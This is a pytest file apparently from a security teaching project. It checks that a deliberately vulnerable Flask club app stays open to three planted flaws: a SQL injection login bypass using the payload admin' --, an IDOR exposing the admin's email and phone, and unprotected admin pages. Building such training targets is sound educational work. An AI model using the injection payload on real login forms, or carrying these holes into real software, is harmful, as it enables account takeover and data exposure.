"""
Regression Tests for Vulnerable App (vulnerable/app.py).
Ensures that the 3 deliberate vulnerabilities (SQLi, IDOR, Broken Access Control)
remain exploitable for educational and demonstration purposes.
"""
import os
import tempfile

import pytest

import vulnerable.app as vuln_module
from vulnerable.app import app as vuln_app
from vulnerable.app import init_db as init_vuln_db


@pytest.fixture
def vulnerable_client(monkeypatch):
    """Provides a test client for vulnerable/app.py backed by an isolated temporary DB."""
    db_fd, db_path = tempfile.mkstemp(suffix=".db")
    os.close(db_fd)

    monkeypatch.setattr(vuln_module, "DB", db_path)
    init_vuln_db()

    vuln_app.config["TESTING"] = True
    client = vuln_app.test_client()

    yield client

    if os.path.exists(db_path):
        try:
            os.remove(db_path)
        except OSError:
            pass


def test_vulnerable_sqli_login_bypass(vulnerable_client):
    """
    Exploit Proof #1 - SQL Injection on /login:
    Payload `admin' --` truncates password verification, granting immediate admin access.
    """
    resp = vulnerable_client.post(
        "/login",
        data={"username": "admin' --", "password": "arbitrary_password"},
        follow_redirects=False
    )
    # Vulnerable app redirects to dashboard on successful SQL injection bypass
    assert resp.status_code == 302
    assert resp.headers["Location"].endswith("/")

    # Verify session was forged as administrator
    with vulnerable_client.session_transaction() as sess:
        assert sess.get("user_id") == 1
        assert sess.get("role") == "admin"

    # Dashboard accepts forged session
    dash_resp = vulnerable_client.get("/")
    assert dash_resp.status_code == 200
    assert b"Club Dashboard" in dash_resp.data


def test_vulnerable_idor_profile_access(vulnerable_client):
    """
    Exploit Proof #2 - IDOR on /profile/<id>:
    Authenticated regular user 'bob' (id=3) accesses admin's profile (/profile/1) without restriction.
    """
    # Authenticate as standard member bob
    with vulnerable_client.session_transaction() as sess:
        sess["user_id"] = 3
        sess["role"] = "member"

    # Request admin's profile
    resp = vulnerable_client.get("/profile/1")
    assert resp.status_code == 200
    # Confirms sensitive PII of admin was leaked to bob
    assert b"admin@club.edu" in resp.data
    assert b"9999999999" in resp.data


def test_vulnerable_broken_access_control_admin_users(vulnerable_client):
    """
    Exploit Proof #3 - Broken Access Control on /admin/users:
    Authenticated regular member 'bob' directly accesses administrative user directory.
    """
    # Authenticate as standard member bob
    with vulnerable_client.session_transaction() as sess:
        sess["user_id"] = 3
        sess["role"] = "member"

    # Request restricted administrative endpoint
    resp = vulnerable_client.get("/admin/users")
    assert resp.status_code == 200
    assert b"All Users (Admin)" in resp.data
    # Exposes all registered users
    assert b"admin" in resp.data
    assert b"alice" in resp.data
    assert b"bob" in resp.data
